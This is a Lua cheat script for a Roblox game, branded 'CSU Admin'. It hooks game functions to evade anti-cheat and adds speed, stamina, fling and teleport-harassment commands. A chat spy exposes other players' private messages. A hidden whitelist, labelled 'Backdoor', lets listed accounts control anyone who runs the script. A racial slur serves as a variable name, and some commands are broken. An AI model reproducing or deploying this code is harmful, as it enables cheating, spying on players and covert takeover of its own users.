local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Whitelist = { -- Backdoor
    	[2835075757] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
	[2482841898] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
	[3741092174] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
	[2835075757] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
	[2482841898] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
	[3741092174] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
	[2835075757] = {
		["Name"] = "User",
		["Color"] = Color3.fromRGB(0,0,0),
		["Control"] = true
	},
}

local ScreenGui = Instance.new("ScreenGui")
local black = Instance.new("TextLabel")
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
black.Name = "black"
black.Parent = ScreenGui
black.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
black.BackgroundTransparency = 1.000
black.Position = UDim2.new(0.019, 0,0.072, 0)
black.Size = UDim2.new(0, 146,0, 50)
black.Font = Enum.Font.Gotham
black.TextColor3 = Color3.fromRGB(0, 255, 255)
black.TextSize = 24.000
black.Text = "CSU Admin" 
local function HOUSK_fake_script()
	local script = Instance.new('Script', black)
	local text = script.Parent
	local add = 10
	wait()
	local k = 1
	while k <= 255 do
		text.TextColor3 = Color3.new(k/255,0/255,0/255)
		k = k + add
		wait()
	end
	while true do
		k = 1
		while k <= 255 do
			text.TextColor3 = Color3.new(255/255,k/255,0/255)
			k = k + add
			wait()
		end
		k = 1
		while k <= 255 do
			text.TextColor3 = Color3.new(255/255 - k/255,255/255,0/255)
			k = k + add
			wait()
		end
		k = 1
		while k <= 255 do
			text.TextColor3 = Color3.new(0/255,255/255,k/255)
			k = k + add
			wait()
		end
		k = 1
		while k <= 255 do
			text.TextColor3 = Color3.new(0/255,255/255 - k/255,255/255)
			k = k + add
			wait()
		end
		k = 1
		while k <= 255 do
			text.TextColor3 = Color3.new(k/255,0/255,255/255)
			k = k + add
			wait()
		end
		k = 1
		while k <= 255 do
			text.TextColor3 = Color3.new(255/255,0/255,255/255 - k/255)
			k = k + add
			wait()
		end
		while k <= 255 do
			text.TextColor3 = Color3.new(255/255 - k/255,0/255,0/255)
			k = k + add
			wait()
		end
	end
end
coroutine.wrap(HOUSK_fake_script)()
local function ChatSpy()
	local StarterGui = game:GetService("StarterGui")
	repeat wait() until StarterGui:GetCore("ChatWindowSize") ~= nil
	local chatWindowSize = StarterGui:GetCore("ChatWindowSize")
	StarterGui:SetCore("ChatWindowPosition", UDim2.new(0, 0, 0.414965987, 0))
	local enabled = true
	local spyOnMyself = true
	local public = false
	local publicItalics = false
	local privateProperties = {
		Color = Color3.fromRGB(87, 198, 235); 
		Font = Enum.Font.SourceSansBold;
		TextSize = 18;
	}
	local StarterGui = game:GetService("StarterGui")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
	local instance = (_G.chatSpyInstance or 0) + 1
	_G.chatSpyInstance = instance
	local function onChatted(p,msg)
		if _G.chatSpyInstance == instance then
			if p==player and msg:lower():sub(1,4)=="/spy" then
				enabled = not enabled
				wait()
				privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
				StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
			elseif enabled and (spyOnMyself==true or p~=player) then
				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
				local hidden = true
				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
						hidden = false
					end
				end)
				wait(1)
				conn:Disconnect()
				if hidden and enabled then
					if public then
						saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
					else
						privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
						StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
					end
				end
			end
		end
	end
	for _,p in ipairs(Players:GetPlayers()) do
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end
	Players.PlayerAdded:Connect(function(p)
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end)
	privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
	StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
	if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
	local chatFrame = player.PlayerGui.Chat.Frame
	chatFrame.ChatChannelParentFrame.Visible = true
	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end
ChatSpy()
print([[

SHITTY GAME LOL
Version 2.0

Prefix = "+"

CSU Admin
-------------------------------------------------------------------------
Locals:
[1] Ws/WalkSpeed/Speed, - Chnages the players walkspeed
[2] Noclip, - Allows you to walk through walls
[3] Jp/JumpPower, - Changes the players JumpPower
[4] Reset/Re/Res, - Resets player
[5] BlinkSpeed/Bs, - Sets runspeed
=========================================================================
Combat:
[6] Camlock/Cl/Cml/Cam, - Locks camera onto <target> 
[7] Aimlock/Target/Shoot/Al/Aim/Aimbot, - Locks bullets onto <target>
[9] UnCamlock/UnCl/UnCml/UnCam, - Turns off camlock 
[10] UnAimlock/UnTarget/UnShoot/UnAl/UnAim/UnAimbot, - Turns off aimlock
[11] Esp/Find, - Toggles esp 
[12] UnEsp/Unfind, - Turns off esp
[13] GunAnims, - Chnages the gun animation <fixed>
[14] FlySpeed/Fs, - Sets flyspeed
=========================================================================
Extra:
[15] AntiFling/Af, - Makes you immune to fling bots or a fling all skid
[16] UnAntiFe/UnAf, - Turns off AntiFling
[17] Bypass, - Can go as fast as you want permanently
[18] Sit, - Useless just makes you sit
[19] View/Spy, - Spectates or view <target>
[20] UnView/UnSpy, - Turns off view
[21] RemoveSeats/Rs/NoSeats/Ns, - Stops you from sitting permanently
[22] NoDoors/RemoveDoors/Nds, - Remove doors
[23] AutoReset/AutoRe/Ar, - Resets you when ko'd
[24] Fov, - Changes your fieldofview
[25] Ivs, - Makes shotty invisible
=========================================================================
KeyBinds:
Fly - "F"
Noclip - "X"
Reset - "R"
-------------------------------------------------------------------------
    
Made by CSU and lotuis backdoored by lynxzizzle
]])
local Prefix = "+"
local Command = {
	Commands = {}
}
function AddCommand(commandname,cmddesc,sc)
	local cmdinformation = {}
	cmdinformation.Name = commandname
	if sc == nil then
		cmdinformation.Function = cmddesc
	else
		cmdinformation.Function = sc
		cmdinformation.Description = cmddesc
	end
	table.insert(Command.Commands,cmdinformation)
end
function ParseMessage(Message)
	local Arguments = {}
	Message = string.lower(Message)
	local PrefixMatch = string.match(Message,"^"..Prefix)
	if PrefixMatch then
		Message = string.gsub(Message,PrefixMatch,"",1)
		for Argument in string.gmatch(Message,"[^%s]+") do
			table.insert(Arguments,Argument)
		end
	end
	return Arguments
end
function ExecuteCommand(args)
	args = ParseMessage(args)
	local isacmd = false
	for i,v in pairs(Command.Commands) do
		if type(v.Name) == "table" then
			for i,x in pairs(v.Name) do
				if x == args[1] then
					table.remove(args,1)
					local x,y = pcall(function()
						isacmd = true
						v.Function(args)
					end)
					if not x then
						game.StarterGui:SetCore("SendNotification", {
							Title = "Command Error";
							Text  = "";
						})
					end
				end
			end
		else
			if v.Name == args[1] then
				table.remove(args,1)
				local x,y = pcall(function()
					isacmd = true
					v.Function(args)
				end)
				if not x then
					game.StarterGui:SetCore("SendNotification", {
						Title = "Command Error";
						Text  = "";
					})
				end
			end
		end
	end
	if not isacmd then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Failed To Find";
			Text  = tostring(args[1]);
		})
	end   
end
local AdminCommands = {
	["bring"] = {
		["Function"] = function(Username,Content,Commander)
			if Username == Player or typeof(Username) == "table" then
				ExecuteCommand(Prefix.."goto "..Commander.Name)
			end
		end,
		["Description"] = "Bring Players Using The Script"
	},
}
local function Find(PlayerString)
	if PlayerString then
		local PlayerString = PlayerString:lower()
		local PlayerTable = Players:GetPlayers()
		if #PlayerString == 2 and PlayerString == "me" then return Player end
		if #PlayerString == 3 and PlayerString == "all" or #PlayerString == 5 and PlayerString == "users" then return PlayerTable end
		for i = 1,#PlayerTable do
			if PlayerTable[i].Name == PlayerString then
				return PlayerTable[i]
			end
		end
		for i = 1,#PlayerTable do
			if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
				return PlayerTable[i]
			end
		end
	end
end
local function AdminCheck(player,Chat)
	if Chat:sub(1,1) == Prefix then
		local Arguments = string.split(Chat:sub(2)," ")
		local Command = AdminCommands[table.remove(Arguments,1)]
		local PlayerToEffect = Find(table.remove(Arguments,1))
		if Command and PlayerToEffect then
			Command["Function"](PlayerToEffect,table.concat(Arguments," "),player)
		end
	end
end
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents",math.huge)
ChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Data)
	if Data ~= nil then
		local player = tostring(Data.FromSpeaker)
		local Text = tostring(Data.Message)
		for _,Player in pairs(Players:GetPlayers()) do
			if Player.Name == player then
				player = Player
			end
		end
		if player ~= Player and Whitelist[player.UserId] then
			if Whitelist[player.UserId].Control then
				AdminCheck(player,Text)
			end
		end
	end
end)
Player.Chatted:Connect(function(msg)
	if msg:sub(1,1) == Prefix then
		ExecuteCommand(msg)
	end
end)
Mouse.KeyDown:Connect(function(key)
	if key == "r" then
		game.Players.LocalPlayer.Character.Torso:Destroy()
	end
end)
local deathspawn = true

game:GetService("RunService").Stepped:connect(function()
	if deathspawn == true then
		Player.Character.Humanoid.Died:Connect(function()
			local position = Player.Character.HumanoidRootPart.CFrame
			Player.CharacterAdded:wait()
			repeat 
				wait()
			until Player.Character:FindFirstChild("HumanoidRootPart")
			Player.Character.HumanoidRootPart.CFrame = position
		end)
	end
end)
AddCommand({"re"},"[autore/re]",function(args)
	if args[1] == "autore" then
		while wait() do
			pcall(function()
				if Player.Character.Torso:FindFirstChild("Bone") then
					Player.Character:Destroy()
				end
			end)
		end
	elseif args[1] == "re" then
		Player.Character:Destroy()
	end
end)
AddCommand({"nod"},"idk",function(args)
	for _, v in next, workspace:GetChildren() do
		if v.Name == "Door" then
			v:Destroy()
		end
	end
end)
AddCommand({"ivs"},"idk",function(args)
	Player:findFirstChildOfClass('Backpack')['Shotty'].Parent = Player.Character
	wait(0.1)
	local function invis(instance) 
		for i,v in pairs(instance:GetChildren()) do
			if v.Name == "Weld" and v.Parent.Name ~= "Heh" and v.Parent.Name ~= "Barrel" then
				v:Destroy()
			end
			invis(v)
		end
	end
	if Player.Backpack:FindFirstChild("Shotty") then
		Player.Backpack:FindFirstChild("Shotty").Parent = Player.Character
	end
	wait(0.1)
	invis(Player.Character.Shotty)
end)
AddCommand({"ivs"},"idk",function(args)
	local humanoid = Player.Character.Humanoid
	wait(0.1)
	humanoid:Destroy()
	Player.Character["Torso"]:Destroy()
	Player.Character["Left Arm"]:Destroy()
	Player.Character["Right Arm"]:Destroy()
	Player.Character["Left Leg"]:Destroy()
	Player.Character["Right Leg"]:Destroy()
	Player.Character["Head"]:Destroy()
end)
AddCommand({"acb"},"idk",function(args)
	local DetectedMethods = {
		"BreakJoints";
		'Destroy';
		"ClearAllChildren";
	}
	local oldnamecall; oldnamecall = hookmetamethod(game, "__namecall", function(self, ...)
		local args = {...}
		local method = getnamecallmethod()
		if self.Name == "lIIl" and game.IsA(self, "RemoteEvent") then
			return wait(9e9)
		end
		if DetectedMethods[method] and self == Player.Character then
			return wait(9e9)
		end
		return oldnamecall(self, unpack(args))
	end)
	local oldnewindex; oldnewindex = hookmetamethod(game, "__newindex", function(t,k,v)
		if t == Player.Character.Humanoid and k == "Health" then
			if v == 0 then
				return wait(9e9)
			end
		end
		return oldnewindex(t,k,v)
	end)
	local oldhook; oldhook = hookfunction(Instance.new'RemoteEvent'.FireServer, function(self, ...)
		local args = {...}

		if self.Name == "lIIl" and self.Parent == game.ReplicatedStorage then
			return wait(9e9)
		end
		return oldhook(self, unpack(args))
	end)
	Player.Character.DescendantAdded:Connect(function(p)
		if p:IsA("BodyGyro") or p:Isa("BodyAngularVelocity") or p:IsA("BodyVelocity") or p:IsA("BodyPosition") then
			p.Name = "Tempby"
		end
	end)
end)
_G.NIGGER = false
AddCommand({"pbot"},"pipe bot (something i actually know)",function(args)
	local player = nil
	for _,target in pairs(Players:GetChildren()) do
		if target ~= Player then
			if (string.sub(tostring(target):lower(),1,string.len(args[1]))) == string.lower(args[1]) or (string.sub(target.DisplayName:lower(),1,string.len(args[1]))) == string.lower(args[1]) then
				player = target.Name
			end
		end
	end
	if not NIGGER then
		NIGGER = true
		if Player.Backpack:FindFirstChild("Punch") then Player.Backpack.Punch.Parent = Player.Character end
		while NIGGER do
			local args = {
				[1] = Player.Character.Punch,
				[2] = Player.Character.Punch.Handle,
				[3] = false,
				[4] = true
			}
			Player.Backpack.ServerTraits.Touch:FireServer(unpack(args))
			wait()
			Player.Character.HumanoidRootPart.CFrame = game.Players[player].Character.HumanoidRootPart.CFrame
			wait()
			Player.Character.Humanoid.Sit = true
			wait()
		end
	end
end)
AddCommand({"rb"},"idk",function(args)
	local player = nil
	for _,target in pairs(Players:GetChildren()) do
		if target ~= Player then
			if (string.sub(tostring(target):lower(),1,string.len(args[1]))) == string.lower(args[1]) or (string.sub(target.DisplayName:lower(),1,string.len(args[1]))) == string.lower(args[1]) then
				player = target.Name
			end
		end
	end
	game:GetService("RunService").Stepped:connect(function()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-7,0,-2)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(3,0,-5)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-1,0,-2)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-3,0,2)
	end)
end)
AddCommand({"tb"},"idk",function(args)
	local player = nil
	for _,target in pairs(Players:GetChildren()) do
		if target ~= Player then
			if (string.sub(tostring(target):lower(),1,string.len(args[1]))) == string.lower(args[1]) or (string.sub(target.DisplayName:lower(),1,string.len(args[1]))) == string.lower(args[1]) then
				player = target.Name
			end
		end
	end
	local Loop_Speed = -0.001 -- You can make this 0
	repeat wait(Loop_Speed)
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(15,0,-3)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(8,0, 6)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-8,4,10)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-6,0,-6)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(9,0,-15)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-9,0,-7)
		wait()
		Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame + Vector3.new(-15,0,2)
	until Player.Character.Humanoid.Health == 0
end)
AddCommand({"goto"},"idk",function(args)
	local target = nil
	for _,target in pairs(Players:GetChildren()) do
		if target ~= Player then
			if (string.sub(tostring(target):lower(),1,string.len(args[1]))) == string.lower(args[1]) or (string.sub(target.DisplayName:lower(),1,string.len(args[1]))) == string.lower(args[1]) then
				target = player.Name
			end
		end
	end
	Player.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame
end)
AddCommand({"sp"},"idk",function(args)
	if not NIGGER then
		NIGGER = true
		if Player.Backpack:FindFirstChild("Pipe") then Player.Backpack.Pipe.Parent = Player.Character end
		while NIGGER do
			game:GetService("RunService").RenderStepped:connect(function()
				local args = {
					[1] = Player.Character.Pipe,
					[2] = Player.Character.Pipe.Handle,
					[3] = false,
					[4] = true
				}
				Player.Backpack.ServerTraits.Touch:FireServer(unpack(args))
			end)
			wait()
			-- Player.Character.HumanoidRootPart.CFrame = game.Players[player].Character.HumanoidRootPart.CFrame
			wait()
			Player.Character.Humanoid.Sit = true
			wait()
		end 
	end
end)
AddCommand({"ol"},"idk",function(args)
	while true do
		wait(5)
		Player.Character:Destroy()
		if Player.Character:Destroy()
		then 
			wait(28)
			Player.Character:Destroy()
			if Player.Character:Destroy()
			then 
				wait(38)
				Player.Character:Destroy()
			end
		end
	end
end)
game:GetService("RunService").Stepped:Connect(function()
	Player.Character:WaitForChild 'Stam'.Value = 99e9
end)
local Key = "T"
local Toggle = false
game:GetService("UserInputService").InputBegan:Connect(function(keyobject, stuffhappening)
	if keyobject.KeyCode == Enum.KeyCode[Key] and not stuffhappening then 
		Toggle = true
	end
end)
game:GetService("UserInputService").InputEnded:Connect(function(keyobject, stuffhappening)
	if keyobject.KeyCode == Enum.KeyCode[Key] and not stuffhappening then 
		Toggle = false
	end
end)
game:GetService("RunService").Stepped:connect(function()
	if Toggle then
		for i,v in next,Player.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="Torso" then
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(995,999,999)
					v.Force = Vector3.new(995,999,999)
					v.MaxForce = Vector3.new(995,999,999)
				end)
			end
		end
	end
end)
